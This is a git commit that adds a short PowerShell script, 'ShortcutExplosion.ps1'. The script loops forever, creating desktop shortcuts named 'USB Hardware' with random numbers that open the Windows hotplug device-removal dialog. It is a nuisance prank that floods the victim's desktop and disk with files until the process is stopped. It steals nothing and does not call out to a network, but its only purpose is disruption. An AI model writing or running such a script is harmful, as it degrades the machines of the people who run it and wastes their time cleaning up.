ed6f4d4da52a825d2af1a78c2342aae8164336ee
Andrew Gunderman <agunderman10@gmail.com>
2019-03-07 16:36:28 -0500

    Create ShortcutExplosion.ps1

---
+++ ShortcutExplosion.ps1
@@ -0,0 +1,13 @@
+while(1) 
+{
+$num = Get-Random
+$AppLocation = "C:\Windows\System32\rundll32.exe"
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
+$Shortcut.TargetPath = $AppLocation
+$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
+$Shortcut.IconLocation = "hotplug.dll,0"
+$Shortcut.Description ="Device Removal"
+$Shortcut.WorkingDirectory ="C:\Windows\System32"
+$Shortcut.Save()
+}
